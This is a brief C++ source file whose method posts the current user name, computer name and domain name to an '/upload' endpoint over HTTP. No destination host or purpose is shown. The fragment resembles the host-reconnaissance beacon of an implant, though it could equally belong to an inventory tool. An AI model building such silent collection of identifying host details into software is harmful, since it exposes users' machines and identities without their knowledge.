#include "../header/UserDataUploader.h"

void UserDataUploader::uploadUserData(const std::string& userName, const std::string& computerName,
	const std::string& domainName) {
    std::string postData = "userName=" + userName + "&computerName=" + computerName + "&domainName=" + domainName;
    std::string headers = "Content-Type: application/x-www-form-urlencoded";

    if (!httpClient.sendData("/upload", postData, headers)) {
        std::cerr << "Failed to upload user data" << std::endl;
    }
}